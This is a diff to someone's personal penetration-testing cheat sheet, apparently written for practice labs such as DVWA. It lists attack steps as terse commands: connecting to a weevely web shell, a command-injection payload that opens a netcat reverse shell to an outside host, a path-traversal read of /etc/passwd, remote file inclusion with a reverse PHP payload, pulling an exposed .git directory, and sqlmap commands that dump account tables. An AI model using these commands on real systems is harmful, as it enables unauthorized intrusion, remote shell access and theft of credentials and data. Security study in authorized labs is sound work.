@@ -81,7 +81,13 @@ weevely generate (any_pass) /storage_path/file_name
 weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 [listen for backdoor connection]
 
-[+] look for robot.txt files and open 
+[+] look for robots.txt files and open -- Information disclosure
+[+] ./feroxbuster -u (web_URL) -w (wordlist)
+- locate url with "cgi-/bin" then load to check for secret key in PHP file
+- locate "/.git" directory 
+- "wget -r (url)" to get folders in git then analyse the git file using "view master's history" option on git software
+- 
+[+] 
 [+] use "; nc -e /bin/sh 192.168.136.128 8080" in net service to check RCE vulnerability while listening in port (nc --vv -l -n -p 8080)
 [+] use "?page=../../../../../etc/passwd" on site link to perform LFI (check if there is "/include.php" on site)
 [+] RFI using "nc -vv -l -n -p 8080" and URL of reverse php payload saved on apache web server 
@@ -104,6 +110,7 @@ weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 - sqlmap -u "url" --tables -D (db_name)  --check db tables
 - sqlmap -u "url" --columns -T (desired_column) -D (db_name)  --open column
 - sqlmap -u "url" -T accounts -D owasp10 --dump   ---open all database file
+- 
 
 [+] 
 
